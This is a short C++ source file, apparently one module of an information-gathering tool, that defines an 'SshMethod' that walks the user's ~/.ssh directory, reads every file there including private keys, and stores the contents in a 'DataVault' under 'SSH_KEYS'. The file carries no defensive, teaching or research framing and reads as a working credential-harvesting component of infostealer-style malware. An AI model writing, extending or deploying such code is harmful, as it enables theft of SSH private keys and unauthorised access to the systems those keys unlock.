#include "modules/gathering/Ssh.hpp"
#include "utils/FileUtils.hpp"
#include "utils/SystemUtils.hpp"
#include "utils/Logger.hpp"
#include "utils/DataVault.hpp"

bool SshMethod::trigger() {
    std::string homeDir = SystemUtils::GetUserHome();
    std::string sshDir = homeDir + "/.ssh";

    std::vector<std::string> files = FileUtils::ListFilesRecursively(sshDir);

    int successCount = 0;
    for (const auto& filePath : files) {
        LOG_INFO("Reading {}", filePath)
        std::string data = FileUtils::ReadFile(filePath);

        if (!data.empty()) {
            std::string formattedData = "=== " + filePath + " ===\n" + data;
            DataVault::Append("SSH_KEYS", formattedData);
            successCount++;
        }
    }

    return successCount > 0;
}
